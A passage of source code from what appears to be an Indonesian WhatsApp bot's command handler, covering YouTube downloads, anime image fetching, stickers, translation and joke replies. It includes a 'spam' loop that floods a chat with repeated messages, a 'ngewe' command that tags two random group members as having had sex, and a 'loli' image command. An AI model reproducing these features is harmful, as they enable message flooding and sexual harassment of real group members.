               res = await y2mateA(res.all[0].url).catch(e => {
               reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
             //  if (res.all[0].timestamp >= 10:00) return reply("Maaf Durasi melebihi batas yang di tentukan, audio tidak akan di kirim")
               sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
}

               break
           
           
           
           
          
case 'ytmp4':
                     if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
                     if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			         let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			         if (!isLinks2) return reply(mess.error.Iv)
                     reply(mess.wait)
				     try {
				     ytv(args[0])
				    .then((res) => {
				     const { dl_link, thumb, title, filesizeF, filesize } = res
				     axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				    .then((a) => {
				     if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*YT MP4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
				     const captionsYtmp4 = `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Please wait, the media file is being sent it may take a few minutes_`
				     sendMediaURL(from, thumb, captionsYtmp4)
				     sendMediaURL(from, dl_link).catch(() => reply(mess.Iv)) 
				     limitAdd(sender, limit)
				     })		
				     })
				     } catch (err) {
			         reply(mess.error.Iv)
				     }
				    break






 
           case 'ytmp4hd':
     case 'ythd':
     if (!isPremium && !isOwner && !dev.key.fromMe) return reply(`Kamu bukan user premium`)
            if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return reply(mess.error.Iv)
            try {
            reply(mess.wait)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${title}\`\`\`
\`\`\`🐥 Kualitas* : 720p\`\`\`
\`\`\`🐥 Size* : ${filesizeF}\`\`\`
\`\`\`🐥 Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`?? Title : ${title}\`\`\`
\`\`\`🐥 Kualitas : 720p\`\`\`
\`\`\`🐥 Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))
})		
})
              } catch (err) {
              reply(`eror`)
}
              break
           
           
           case 'spam':
				if (!isOwner && !dev.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					xdev.sendMessage(from, argzi[0], MessageType.text)
				}
				break
         
           
           
           
     
    

      
           
           
                    
                    
           
           
           
           
           case 'kodebahasa':
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
reply2(LANGUAGES)
break
           
           
       
           
         
        
           
           

case 'status':
case 'stats':
				var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalchat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Charged : ${baterai.isCharge}
Mode : ${publik ? 'public' : 'self'}
Prefix : 「 ${prefa} 」
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${xdev.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${xdev.user.phone.wa_version}
Os Version: ${xdev.user.phone.os_version}

⍟ ────────────────── ⍟`

reply2(stamtus)
break
				
           
           
           
           
           
           
           
           
           
           
           
     
           
           
           
           
           
           
           
           
           
           case 'anna':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Anna.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           case 'asunayuki':
           
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)          
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Asuna_yuki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            
            
            
            case 'ayuzawa':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Ayuzawa_misaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'chitoge':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Chitoge_kirisaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'emilia':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Emilia.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'erza':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Erza_scarlet.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           case 'hinata':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Hinata.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            
            
            
            case 'naruto':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Naruto.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            case 'zalgo':
					if (!isOwner) return reply(mess.only.owner)
					if (args.length < 1) return reply("text nya mana ?")
					reply(zalgo(`${q}`))
				break 
            
            case 'sasuke':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Sasuke.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           
           case 'translate': case 'tr':
									try {
										if (args.length < 1)return reply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { reply(`${res}`) })
											} else {
												tolang = args[0]
												entah = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { reply(`${res}`) })
												}
											} catch (e) {
												reply(`${e}`)
												}
											break
           
           
           
           
           
           
           
           
           
           
           
           
           
                   
           
           
          
           
           
           case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: dev, caption: result}).catch(e => {
  reply(result)
})
break
           
           
           
           
          
                
               
                    
		
           
           
                    
        
                    
        
           
           
          
		
				
                
           
           
           
           
           
       
       case 'loli':
       case 'milf':
       case 'husbu':
       case 'cosplay':
       case 'wallml':
         if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
              xdev.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              limitAdd(sender, limit)
              break  
           case 'narutoteks':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pNaruto(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url, q)
										})
									break
						case 'shadow':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pShadow(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'romantic':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pRomantic(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'smoke':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pSmoke(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'burnpaper':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pBurnPapper(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'lovemsg':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveMsg(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'grass':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pMsgGrass(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'doubleheart':
									if (!q) return reply('teksnya Lord?')
									reply(mess.wait)
									pDoubleHeart(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'coffecup':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pCoffeCup(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'lovetext':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveText(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'butterfly':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pButterfly(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						
           
           
           
           
           
           
           
           
           
           
           
           
           
           
          
           
           
           
           
           
           
           
           
           
        
           
           
           
           
           
           
           
           
           
    case 'buttons1':
       if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
               reply('*Donwloading...*')
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Error')
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
              break
     case 'buttons2':
        if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
              reply('*Donwloading...*')
              if (args.length < 1) return reply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
              break
              
       
             
           
           
           
           
           
           
           
        
        case 'attp':
        try {
        	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              if (args.length == 0) return reply(`Example: ${prefix + command} YUxdev`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              xdev.sendMessage(from, buffer, sticker, { quoted: dev })
               } catch (e) {
               console.log(e)
              return reply(`Maap sedang error coba lagi besok`)
              limitAdd(sender, limit)
}
              break
              
              
              
              
              
case 'ttp':
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
reply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
	
	
	
	
case 'ttp2':                     
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!q)return reply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=black`
reply(mess.wait)
sendStickerUrl(from, buffer)
limitAdd(sender, limit)
break
	
case 'ttp3':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!q)return reply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/attp?teks=${q}`
reply(mess.wait)
sendStickerUrl(from, buffer)
limitAdd(sender, limit)
break



    case 'gura':
                case 'gurastick':{
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]                    
                    sendStickerUrl(from, wifegerakx)
             		limitAdd(sender, limit)
                    }
                    break          

        
        
        
        
        
        
           //By yudha perdana
           case 'wangy':
              if (!q) return reply('query')
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              xdev.sendMessage(from, awikwok, text)
              break
           
           
           
           
           
           
              case 'yts':
              case 'ytsearch':
              if (!q) return reply('Format salah')
              reply('Tunggu sebentar')
              try {
              res = await yts(q)
              a = `*Youtube Search 🔎*\n`
for (let i of res.all) {
a += `
📜 Title : ${i.title}
🎞️ Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: b, contextInfo: forward})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
           
           
           
           
           
 
           
           

           case 'd':
				case 'del':
				case 'delete':
				if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return reply("Untuk menghapus reply pesan botnya")
				if(!isQuotedReply) return reply("Reply pesan bot")
				premnih = dev.message.extendedTextMessage.contextInfo.participant
                
					xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					
					break
           
           
           
           
				
		
           
          
           
           
           
           
           
           case 'jadian':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           if(!isGroup) return reply("Ga mau ah, lu jelek")
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					limitAdd(sender, limit)
					break
	
case 'ngewe':
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isGroup) return reply("Maap om aku masih blom cukup umur")
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					limitAdd(sender, limit)
					break
           
           
				

				

			

           
           case 'memeindo':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
          data = fs.readFileSync('./lib/game/memeindo.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
            buffer = await getBuffer(randKey.result)
           xdev.sendMessage(from, buffer, image, {quoted : dev, caption : "Nih"})
           limitAdd(sender, limit)
           break
           
           
           
           
           case 'diem':
			      if (!isOwner) return sendvn(gakmau)
			    if (!isGroup) return 
                if (isMuted) return reply(`*aku udah diem nih*`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                fakestatus( `*Baik kak* 😥 `)
                break
                
                case 'udah':
      if (!isOwner) return sendvn(gakmau)
			    if (!isGroup) return 
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                fakestatus(`*Oke kak* 😁`)
            break
					
           
           
         
           
           
           
           case 'katailham':  
                       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
					xdev.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: dev })
					limitAdd(sender, limit)
					break
					
					case 'bucin':
		            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
					xdev.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: dev })
					limitAdd(sender, limit)
					break
           
 case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
					break

case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
					break
					
case 'apakah':
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
					break
					
case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
					break
					
case 'rate':
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
					break
					
case 'sangecek':
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
